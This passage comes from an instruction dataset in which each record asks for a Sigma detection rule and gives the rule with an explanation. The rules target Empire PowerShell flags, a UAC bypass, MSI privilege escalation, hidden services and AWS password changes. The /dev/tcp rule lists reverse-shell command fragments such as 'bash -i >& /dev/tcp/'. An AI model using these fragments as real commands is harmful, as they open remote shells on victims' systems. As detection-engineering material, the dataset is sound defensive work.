      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    system_integrity:\n        IntegrityLevel: 'System'\n    system_user:\n        User: 'NT AUTHORITY\\SYSTEM'\n    image_1:\n        Image|contains|all:\n            - '\\Windows\\Installer\\'\n            - 'msi'\n        Image|endswith:\n            - 'tmp'\n    image_2:\n        Image|endswith: '\\msiexec.exe'\n    child_of_suspicious_guid:\n        ParentProcessGuid: '%suspicious_guid%'\n    condition: write ProcessGuid from (event_id and image_2 and not system_user) to %suspicious_guid%; then if (child_of_suspicious_guid and event_id and image_1 and system_user) or (suspicious_guid and event_id and image_2 and system_user and integrity_level) -> alert\nfields:\n    - EventID\n    - IntegrityLevel\n    - User\n    - Image\n    - ParentProcessGuid\nfalsepositives:\n    - System administrator usage\nlevel: high",
      "question": "This rule will looks any process with low privilege launching Windows Installer service (msiexec.exe) that tries to install MSI packages with SYSTEM privilege",
      "answer": "In order to detect any process with low privilege launching Windows Installer service (msiexec.exe) that tries to install MSI packages with SYSTEM privilege, you should monitor Windows process creation logs for specific patterns indicating potential exploitation of permissions elevation. Specifically:\n\n1. Look for instances where a process is created with 'System' integrity level or by the 'NT AUTHORITY\\SYSTEM' user. These represent high privilege operations likely performed by the system itself or a system administrator. However, in the context of suspicious activity, they could indicate malicious attempts to execute code or commands with elevated privileges.\n\n2. Identify any process named 'msiexec.exe' that does not originate from a user with 'NT AUTHORITY\\SYSTEM' privileges. The Windows Installer service, represented by 'msiexec.exe', is legitimate, but when initiated by low-privilege users, it may indicate an attempt to leverage Windows Installer for malicious purposes.\n\n3. Detect processes that have a parent process identifier (ParentProcessGuid) matching a previously noted suspicious process identifier (%suspicious_guid%). This linkage between processes suggests a chain of execution potentially leading to privilege escalation.\n\n4. Specifically target processes that are child of a suspect process and meet these criteria:\n   - The executable image path contains '\\Windows\\Installer\\' and has an 'msi' extension, ending with 'tmp'. These characteristics are unusual for legitimate use of the Windows Installer and may signify tampering or malicious MSI packages being installed.\n   - The process is executed at the system integrity level or by the 'NT AUTHORITY\\SYSTEM' user. This indicates an intent to execute with elevated privileges, bypassing normal user access controls.\n\nThe conditions for alerting include:\n   - Capturing the ProcessGuid of any 'msiexec.exe' process (not initiated by 'NT AUTHORITY\\SYSTEM') as a suspicious identifier.\n   - Triggering an alert if there\u2019s a process, originated with SYSTEM privilege, attempting to install an MSI package following the suspicious 'msiexec.exe' execution or directly attempting to execute 'msiexec.exe' with SYSTEM privileges, satisfying the specified image path conditions.\n\nIn analyzing logs for these patterns, one must account for false positives, such as legitimate system administrator activities that may involve similar process creation characteristics. Monitoring should be set at a high level of alert due to the potential severity of exploiting the Windows Installer service to elevate privileges maliciously.\n\nBy examining these specific indicators within the Windows process creation logs, you can uncover attempts to exploit the Windows Installer service to execute MSI packages with elevated SYSTEM privilege, a tactic often leveraged by attackers seeking to gain higher access rights on a compromised system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the \"Set-Service\" PowerShell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in PowerShell 7), you should:\n\nMonitor Windows PowerShell script execution logs, specifically looking for script execution that involves the \"Set-Service\" command. This command might be used maliciously to manipulate Windows services in a way that hides them from typical management tools like \"sc.exe\" and \"Get-Service\". The detection focus is on scripts that contain both the string 'Set-Service ' and the unique identifier 'DCLCWPDTSD', along with either the '-SecurityDescriptorSddl ' or '-sd ' strings. These elements indicate an attempt to alter the security descriptors of services, potentially to conceal malicious services. It's important to have Script Block Logging enabled to capture the necessary data for this analysis. However, be aware that there might be rare legitimate uses of such scripts or potential false positives due to the complexity of PowerShell script text analysis. The severity of this detection is classified as high due to the potential impact of hiding malicious services on a Windows system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Set-Service '\n            - 'DCLCWPDTSD'\n        ScriptBlockText|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    condition: selection\nfalsepositives:\n    - Rare intended use of hidden services\n    - Rare FP could occur due to the non linearity of the ScriptBlockText log\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Set-Service '\n            - 'DCLCWPDTSD'\n        ScriptBlockText|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    condition: selection\nfalsepositives:\n    - Rare intended use of hidden services\n    - Rare FP could occur due to the non linearity of the ScriptBlockText log\nlevel: high\n",
      "question": "usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)",
      "answer": "In order to detect usage of the \"Set-Service\" PowerShell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in PowerShell 7), you should:\n\nMonitor Windows PowerShell script execution logs, specifically looking for script execution that involves the \"Set-Service\" command. This command might be used maliciously to manipulate Windows services in a way that hides them from typical management tools like \"sc.exe\" and \"Get-Service\". The detection focus is on scripts that contain both the string 'Set-Service ' and the unique identifier 'DCLCWPDTSD', along with either the '-SecurityDescriptorSddl ' or '-sd ' strings. These elements indicate an attempt to alter the security descriptors of services, potentially to conceal malicious services. It's important to have Script Block Logging enabled to capture the necessary data for this analysis. However, be aware that there might be rare legitimate uses of such scripts or potential false positives due to the complexity of PowerShell script text analysis. The severity of this detection is classified as high due to the potential impact of hiding malicious services on a Windows system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting activity when a security-enabled global group is deleted.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect activity when a security-enabled global group is deleted, you should monitor the security logs from Windows systems for events with Event ID 4730 or 634. These specific Event IDs indicate that a security-enabled global group was deleted. By tracking these Event IDs within the Windows security service logs, it's possible to identify when such significant changes occur within group management activities. It's important to note, however, that the confidence in these detections might be considered low due to the potential for unknown false positives. This activity can be linked with tactics and techniques focused on undermining security control and manipulating user group configurations, which could be indicative of unauthorized access or malicious influence on security protocols.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4730 # A security-enabled global group was deleted\n            - 634 # Security Enabled Global Group Deleted\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4730 # A security-enabled global group was deleted\n            - 634 # Security Enabled Global Group Deleted\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "activity when a security-enabled global group is deleted",
      "answer": "In order to detect activity when a security-enabled global group is deleted, you should monitor the security logs from Windows systems for events with Event ID 4730 or 634. These specific Event IDs indicate that a security-enabled global group was deleted. By tracking these Event IDs within the Windows security service logs, it's possible to identify when such significant changes occur within group management activities. It's important to note, however, that the confidence in these detections might be considered low due to the potential for unknown false positives. This activity can be linked with tactics and techniques focused on undermining security control and manipulating user group configurations, which could be indicative of unauthorized access or malicious influence on security protocols."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro, you should monitor Windows process access events, especially focusing on Event ID 10, which relates to process access. Configure your system to include events where the call trace involves \"VBE7.DLL\" and exclude those with \"UNKNOWN\" in the call trace, as this particular DLL is oftentimes used in legitimate processes.\n\nSpecifically, observe any access attempts targeting \"verclsid.exe\" at the end of the Target Image path, which also have been granted access rights of '0x1FFFFF', indicating full access permissions. This is a significant indicator of a suspicious activity since \"verclsid.exe\" is a Windows program associated with COM object instantiation and not commonly interacted with directly by users or most software.\n\nLook for signs of shellcode injection manifesting in two potential patterns. The first involves call traces that contain both \"UNKNOWN(\" and \"VBE7.DLL\", suggesting a possible obfuscation attempt combined with known VBA macro interaction. The second pattern to monitor involves any source image path containing \"\\Microsoft Office\\\" and call traces with \"|UNKNOWN\", indicating the exploitation might be originating from a Microsoft Office application, a common vector for macro-based shellcode injection.\n\nThe detection is deemed critical due to the combination of high-access permissions and the specific interaction patterns with \"verclsid.exe\", indicating a strong possibility of a malicious macro or Office application attempting to perform unauthorized actions on the system. There may be unknown false positives, indicating that careful examination of each detection is necessary to differentiate between malfeasance and legitimate but unusual behavior.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\n    definition: 'Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch=\"include\"><CallTrace condition=\"contains\">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch=\"exclude\"><CallTrace condition=\"excludes\">UNKNOWN</CallTrace></ProcessAccess>'\ndetection:\n    selection:\n        TargetImage|endswith: '\\verclsid.exe'\n        GrantedAccess: '0x1FFFFF'\n    combination1:\n        CallTrace|contains|all:\n            - '|UNKNOWN('\n            - 'VBE7.DLL'\n    combination2:\n        SourceImage|contains: '\\Microsoft Office\\'\n        CallTrace|contains: '|UNKNOWN'\n    condition: selection and 1 of combination*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\n    definition: 'Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch=\"include\"><CallTrace condition=\"contains\">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch=\"exclude\"><CallTrace condition=\"excludes\">UNKNOWN</CallTrace></ProcessAccess>'\ndetection:\n    selection:\n        TargetImage|endswith: '\\verclsid.exe'\n        GrantedAccess: '0x1FFFFF'\n    combination1:\n        CallTrace|contains|all:\n            - '|UNKNOWN('\n            - 'VBE7.DLL'\n    combination2:\n        SourceImage|contains: '\\Microsoft Office\\'\n        CallTrace|contains: '|UNKNOWN'\n    condition: selection and 1 of combination*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro",
      "answer": "In order to detect a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro, you should monitor Windows process access events, especially focusing on Event ID 10, which relates to process access. Configure your system to include events where the call trace involves \"VBE7.DLL\" and exclude those with \"UNKNOWN\" in the call trace, as this particular DLL is oftentimes used in legitimate processes.\n\nSpecifically, observe any access attempts targeting \"verclsid.exe\" at the end of the Target Image path, which also have been granted access rights of '0x1FFFFF', indicating full access permissions. This is a significant indicator of a suspicious activity since \"verclsid.exe\" is a Windows program associated with COM object instantiation and not commonly interacted with directly by users or most software.\n\nLook for signs of shellcode injection manifesting in two potential patterns. The first involves call traces that contain both \"UNKNOWN(\" and \"VBE7.DLL\", suggesting a possible obfuscation attempt combined with known VBA macro interaction. The second pattern to monitor involves any source image path containing \"\\Microsoft Office\\\" and call traces with \"|UNKNOWN\", indicating the exploitation might be originating from a Microsoft Office application, a common vector for macro-based shellcode injection.\n\nThe detection is deemed critical due to the combination of high-access permissions and the specific interaction patterns with \"verclsid.exe\", indicating a strong possibility of a malicious macro or Office application attempting to perform unauthorized actions on the system. There may be unknown false positives, indicating that careful examination of each detection is necessary to differentiate between malfeasance and legitimate but unusual behavior."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious powershell command line parameters used in Empire.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious PowerShell command line parameters used in Empire, you should monitor for process creation events on Windows systems for specific command line patterns. Look for executions of PowerShell commands that include parameters indicative of an attempt to evade detection and execute encoded commands. These parameters are often used by attackers to launch scripts without leaving easily traceable evidence. Specifically, watch out for PowerShell commands that contain any of the following strings: '-NoP -sta -NonI -W Hidden -Enc ', '-noP -sta -w 1 -enc ', '-NoP -NonI -W Hidden -enc ', '-noP -sta -w 1 -enc', '-enc  SQB', or '-nop -exec bypass -EncodedCommand '. These command line arguments are synonymous with stealth techniques, aiming to run processes in a hidden window, bypass execution policies, or execute encoded commands, which are common tactics in attacks leveraging the Empire framework. Be cautious, however, as there might be false positives where benign tools use similar command line parameters for legitimate purposes. Due to the high risk associated with these command patterns, this activity is classified with a high level of concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - ' -NoP -sta -NonI -W Hidden -Enc '\n            - ' -noP -sta -w 1 -enc '\n            - ' -NoP -NonI -W Hidden -enc '\n            - ' -noP -sta -w 1 -enc'\n            - ' -enc  SQB'\n            - ' -nop -exec bypass -EncodedCommand '\n    condition: selection\nfalsepositives:\n    - Other tools that incidentally use the same command line parameters\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - ' -NoP -sta -NonI -W Hidden -Enc '\n            - ' -noP -sta -w 1 -enc '\n            - ' -NoP -NonI -W Hidden -enc '\n            - ' -noP -sta -w 1 -enc'\n            - ' -enc  SQB'\n            - ' -nop -exec bypass -EncodedCommand '\n    condition: selection\nfalsepositives:\n    - Other tools that incidentally use the same command line parameters\nlevel: high\n",
      "question": "suspicious powershell command line parameters used in Empire",
      "answer": "In order to detect suspicious PowerShell command line parameters used in Empire, you should monitor for process creation events on Windows systems for specific command line patterns. Look for executions of PowerShell commands that include parameters indicative of an attempt to evade detection and execute encoded commands. These parameters are often used by attackers to launch scripts without leaving easily traceable evidence. Specifically, watch out for PowerShell commands that contain any of the following strings: '-NoP -sta -NonI -W Hidden -Enc ', '-noP -sta -w 1 -enc ', '-NoP -NonI -W Hidden -enc ', '-noP -sta -w 1 -enc', '-enc  SQB', or '-nop -exec bypass -EncodedCommand '. These command line arguments are synonymous with stealth techniques, aiming to run processes in a hidden window, bypass execution policies, or execute encoded commands, which are common tactics in attacks leveraging the Empire framework. Be cautious, however, as there might be false positives where benign tools use similar command line parameters for legitimate purposes. Due to the high risk associated with these command patterns, this activity is classified with a high level of concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of binaries located in potentially suspicious locations via \"nohup\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of binaries located in potentially suspicious locations via \"nohup\", you should: Monitor the creation of processes on Linux systems, focusing specifically on those initiated with the 'nohup' command that are executing files from the '/tmp/' directory. This detection hinges on identifying processes that end their image path with '/nohup' and contain '/tmp/' within their command line argument, indicating that binaries are being executed from locations that are commonly used by attackers to temporarily store malicious files. The uncertainty about the nature of activities that match this pattern necessitates considering them as high-severity incidents, despite the recognition that not all such detections will represent true security threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/nohup'\n        CommandLine|contains: '/tmp/'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/nohup'\n        CommandLine|contains: '/tmp/'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of binaries located in potentially suspicious locations via \"nohup\"",
      "answer": "In order to detect execution of binaries located in potentially suspicious locations via \"nohup\", you should: Monitor the creation of processes on Linux systems, focusing specifically on those initiated with the 'nohup' command that are executing files from the '/tmp/' directory. This detection hinges on identifying processes that end their image path with '/nohup' and contain '/tmp/' within their command line argument, indicating that binaries are being executed from locations that are commonly used by attackers to temporarily store malicious files. The uncertainty about the nature of activities that match this pattern necessitates considering them as high-severity incidents, despite the recognition that not all such detections will represent true security threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting pattern of UAC Bypass using ICMLuaUtil Elevated COM interface.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface, you should: Look for the creation of processes on Windows where the parent process is 'dllhost.exe', and the ParentCommandLine includes specific Process IDs '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}' or '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'. However, it's important to ignore cases where the new process being created is 'WerFault.exe', whether identified by the process's image ending with '\\WerFault.exe' or by its original file name. This filtering helps in accurately identifying activities associated with UAC Bypass attempts using the ICMLuaUtil Elevated COM interface, minimizing the chances of detecting regular system activities as false positives. The significance of this detection is marked as high due to the potential security breach it represents.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dllhost.exe'\n        ParentCommandLine|contains:\n            - '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\n            - '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'\n    filter:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dllhost.exe'\n        ParentCommandLine|contains:\n            - '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'\n            - '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'\n    filter:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "pattern of UAC Bypass using ICMLuaUtil Elevated COM interface",
      "answer": "In order to detect the pattern of UAC Bypass using ICMLuaUtil Elevated COM interface, you should: Look for the creation of processes on Windows where the parent process is 'dllhost.exe', and the ParentCommandLine includes specific Process IDs '/Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}' or '/Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}'. However, it's important to ignore cases where the new process being created is 'WerFault.exe', whether identified by the process's image ending with '\\WerFault.exe' or by its original file name. This filtering helps in accurately identifying activities associated with UAC Bypass attempts using the ICMLuaUtil Elevated COM interface, minimizing the chances of detecting regular system activities as false positives. The significance of this detection is marked as high due to the potential security breach it represents."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of CustomShellHost binary where the child isn't located in 'C:\\Windows\\explorer.exe'.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of CustomShellHost binary where the child isn't located in 'C:\\Windows\\explorer.exe', you should: Monitor the creation of processes on Windows systems, focusing on identifying instances where a process named 'CustomShellHost.exe' initiates another process. However, any initiated process that is exactly 'C:\\Windows\\explorer.exe' should be excluded from suspicions. This approach aims to spot potentially malicious activities while minimizing false positives, though it's important to note that some unrelated activities may still be incorrectly flagged as suspicious. The monitoring is guided by medium-level alerts, indicating a balanced sensitivity towards detecting potentially harmful actions without overwhelming the system with false alarms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\CustomShellHost.exe'\n    filter:\n        Image: 'C:\\Windows\\explorer.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\CustomShellHost.exe'\n    filter:\n        Image: 'C:\\Windows\\explorer.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of CustomShellHost binary where the child isn't located in 'C:\\Windows\\explorer.exe'",
      "answer": "In order to detect the execution of CustomShellHost binary where the child isn't located in 'C:\\Windows\\explorer.exe', you should: Monitor the creation of processes on Windows systems, focusing on identifying instances where a process named 'CustomShellHost.exe' initiates another process. However, any initiated process that is exactly 'C:\\Windows\\explorer.exe' should be excluded from suspicions. This approach aims to spot potentially malicious activities while minimizing false positives, though it's important to note that some unrelated activities may still be incorrectly flagged as suspicious. The monitoring is guided by medium-level alerts, indicating a balanced sensitivity towards detecting potentially harmful actions without overwhelming the system with false alarms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious command with /dev/tcp.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious command with /dev/tcp, you should monitor Linux system logs for the appearance of specific patterns indicating potential malicious activity. Specifically, search for commands that involve redirection or connections via /dev/tcp or /dev/udp. Such commands usually include the use of 'cat', 'exec', 'echo', and 'bash' in conjunction with /dev/tcp or /dev/udp to establish a connection, execute commands, or send data. Look out for patterns like 'cat </dev/tcp/', 'exec 3<>/dev/tcp/', 'echo >/dev/tcp/', 'bash -i >& /dev/tcp/', 'sh -i >& /dev/udp/', '0<&196;exec 196<>/dev/tcp/', 'exec 5<>/dev/tcp/', '(sh)0>/dev/tcp/', 'bash -c ''bash -i >& /dev/tcp/' and 'echo -e ''#!/bin/bash\\nbash -i >& /dev/tcp/'. These patterns might be used by attackers to execute commands remotely, create reverse shells, or exfiltrate data. It's important to closely investigate occurrences of these patterns as their usage might indicate an intrusion or an attempt to leverage your system as part of an attack, although keep in mind that there might be unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\ndetection:\n    keywords:\n        - 'cat </dev/tcp/'\n        - 'exec 3<>/dev/tcp/'\n        - 'echo >/dev/tcp/'\n        - 'bash -i >& /dev/tcp/'\n        - 'sh -i >& /dev/udp/'\n        - '0<&196;exec 196<>/dev/tcp/'\n        - 'exec 5<>/dev/tcp/'\n        - '(sh)0>/dev/tcp/'\n        - 'bash -c ''bash -i >& /dev/tcp/'\n        - 'echo -e ''#!/bin/bash\\nbash -i >& /dev/tcp/'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\ndetection:\n    keywords:\n        - 'cat </dev/tcp/'\n        - 'exec 3<>/dev/tcp/'\n        - 'echo >/dev/tcp/'\n        - 'bash -i >& /dev/tcp/'\n        - 'sh -i >& /dev/udp/'\n        - '0<&196;exec 196<>/dev/tcp/'\n        - 'exec 5<>/dev/tcp/'\n        - '(sh)0>/dev/tcp/'\n        - 'bash -c ''bash -i >& /dev/tcp/'\n        - 'echo -e ''#!/bin/bash\\nbash -i >& /dev/tcp/'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "suspicious command with /dev/tcp",
      "answer": "In order to detect suspicious command with /dev/tcp, you should monitor Linux system logs for the appearance of specific patterns indicating potential malicious activity. Specifically, search for commands that involve redirection or connections via /dev/tcp or /dev/udp. Such commands usually include the use of 'cat', 'exec', 'echo', and 'bash' in conjunction with /dev/tcp or /dev/udp to establish a connection, execute commands, or send data. Look out for patterns like 'cat </dev/tcp/', 'exec 3<>/dev/tcp/', 'echo >/dev/tcp/', 'bash -i >& /dev/tcp/', 'sh -i >& /dev/udp/', '0<&196;exec 196<>/dev/tcp/', 'exec 5<>/dev/tcp/', '(sh)0>/dev/tcp/', 'bash -c ''bash -i >& /dev/tcp/' and 'echo -e ''#!/bin/bash\\nbash -i >& /dev/tcp/'. These patterns might be used by attackers to execute commands remotely, create reverse shells, or exfiltrate data. It's important to closely investigate occurrences of these patterns as their usage might indicate an intrusion or an attempt to leverage your system as part of an attack, although keep in mind that there might be unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.\nWith this alert, it is used to detect anyone is changing password on behalf of other users.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect anyone changing the password on behalf of other users, which indicates that an attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile set up, you should focus on monitoring AWS CloudTrail logs. Look for events where the event source is IAM (iam.amazonaws.com) specifically with the event name \"UpdateLoginProfile\". This indicates an attempt to update a login profile, which is a key part of this detection. \n\nFurthermore, it's important to apply a filter to identify suspicious behavior accurately. This involves checking if the ARN (Amazon Resource Name) of the user identity making the request contains the username in the request parameters. If the ARN of the user initiating the request does not match the username for which the login profile is being updated, this can signify malicious activity, such as an unauthorized user attempting to change another user's password. \n\nHowever, it is important to note that certain activities that match these criteria might be legitimate, such as administrators performing routine account maintenance. These are considered potential false positives, specifically actions categorized under legit user account administration.\n\nFor effective monitoring, the following fields should be included in the analysis: the ARN of the user identity (`userIdentity.arn`), the username in the request parameters (`requestParameters.userName`), the error code (`errorCode`), and the error message (`errorMessage`). These fields can provide additional context to distinguish between legitimate and malicious activities.\n\nThe detection of such activities is crucial and is flagged at a high level due to the severity of the potential impact, including unauthorized access to AWS resources.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: iam.amazonaws.com\n        eventName: UpdateLoginProfile\n    filter:\n        userIdentity.arn|contains: requestParameters.userName\n    condition: selection_source and not filter\nfields:\n    - userIdentity.arn\n    - requestParameters.userName\n    - errorCode\n    - errorMessage\nfalsepositives:\n    - Legit User Account Administration\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection_source:\n        eventSource: iam.amazonaws.com\n        eventName: UpdateLoginProfile\n    filter:\n        userIdentity.arn|contains: requestParameters.userName\n    condition: selection_source and not filter\nfields:\n    - userIdentity.arn\n    - requestParameters.userName\n    - errorCode\n    - errorMessage\nfalsepositives:\n    - Legit User Account Administration\nlevel: high\n",
      "question": "An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.\nWith this alert, it is used to detect anyone is changing password on behalf of other users.\n",
      "answer": "In order to detect anyone changing the password on behalf of other users, which indicates that an attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile set up, you should focus on monitoring AWS CloudTrail logs. Look for events where the event source is IAM (iam.amazonaws.com) specifically with the event name \"UpdateLoginProfile\". This indicates an attempt to update a login profile, which is a key part of this detection. \n\nFurthermore, it's important to apply a filter to identify suspicious behavior accurately. This involves checking if the ARN (Amazon Resource Name) of the user identity making the request contains the username in the request parameters. If the ARN of the user initiating the request does not match the username for which the login profile is being updated, this can signify malicious activity, such as an unauthorized user attempting to change another user's password. \n\nHowever, it is important to note that certain activities that match these criteria might be legitimate, such as administrators performing routine account maintenance. These are considered potential false positives, specifically actions categorized under legit user account administration.\n\nFor effective monitoring, the following fields should be included in the analysis: the ARN of the user identity (`userIdentity.arn`), the username in the request parameters (`requestParameters.userName`), the error code (`errorCode`), and the error message (`errorMessage`). These fields can provide additional context to distinguish between legitimate and malicious activities.\n\nThe detection of such activities is crucial and is flagged at a high level due to the severity of the potential impact, including unauthorized access to AWS resources."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting using Diskshadow.exe to execute arbitrary code in text file.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect using Diskshadow.exe to execute arbitrary code in text file, you should: focus on monitoring process creation events within Windows environments. Specifically, look for instances where the process name ends with '\\diskshadow.exe' and the command line includes either '/s' or '-s' parameters. These characteristics are indicative of attempts to use the Diskshadow utility, a legitimate Windows tool, for malicious purposes such as executing arbitrary code through scripts. It is important to capture the command line arguments in the logs for further analysis. Be mindful that in environments where Diskshadow is used for legitimate backup processes by administrators, these indicators may lead to false positives. The severity of this detection is considered high due to the potential misuse of the Diskshadow tool for executing unauthorized code.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\diskshadow.exe'\n        CommandLine|contains:\n            - '/s'\n            - '-s'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - False postitve can be if administrators use diskshadow tool in their infrastructure as a main backup tool with scripts.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\diskshadow.exe'\n        CommandLine|contains:\n            - '/s'\n            - '-s'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - False postitve can be if administrators use diskshadow tool in their infrastructure as a main backup tool with scripts.\nlevel: high\n",
      "question": "using Diskshadow.exe to execute arbitrary code in text file",
